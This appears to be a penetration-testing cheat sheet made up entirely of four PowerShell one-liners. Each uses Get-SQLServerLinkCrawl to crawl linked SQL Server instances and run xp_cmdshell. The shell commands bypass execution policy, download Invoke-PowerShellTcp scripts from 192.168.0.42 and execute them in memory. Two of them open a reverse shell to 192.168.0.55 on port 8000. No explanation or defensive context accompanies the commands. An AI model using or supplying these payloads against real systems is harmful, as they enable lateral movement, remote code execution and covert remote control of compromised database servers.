Get-SQLServerLinkCrawl -Verbose -Instance "sql2" -Query "exec master..xp_cmdshell 'powershell.exe -nop -exec bypass -c ""iex (iwr -UseBasicParsing ''http://192.168.0.42:5555/Invoke-PowerShellTcp.ps1'').Content; Invoke-PowerShellTcp -Reverse -IPAddress 192.168.0.55 -Port 8000""'"
------------
Get-SQLServerLinkCrawl -Verbose -Instance "sql2" -Query "exec master..xp_cmdshell 'powershell.exe -nop -exec bypass -c ""$wc=New-Object Net.WebClient; iex $wc.DownloadString(''http://192.168.0.42:5555/Invoke-PowerShellTcp.ps1''); Invoke-PowerShellTcp -Reverse -IPAddress 192.168.0.55 -Port 8000""'"
------------
Get-SQLServerLinkCrawl -Verbose -Instance "sql2" -Query "exec master..xp_cmdshell 'powershell.exe -nop -exec bypass -c ""iex ((New-Object Net.Webclient).DownloadString("http://192.168.0.42:5555/Invoke-PowerShellTcpEx.ps1"))""'"
--------------
Get-SQLServerLinkCrawl -Verbose -Instance "sql2" -Query "exec master..xp_cmdshell 'powershell -nop -exec bypass -c ""iex (iwr -UseBasicParsing ''http://192.168.0.42:5555/Invoke-PowerShellTcpEx.ps1'')""'"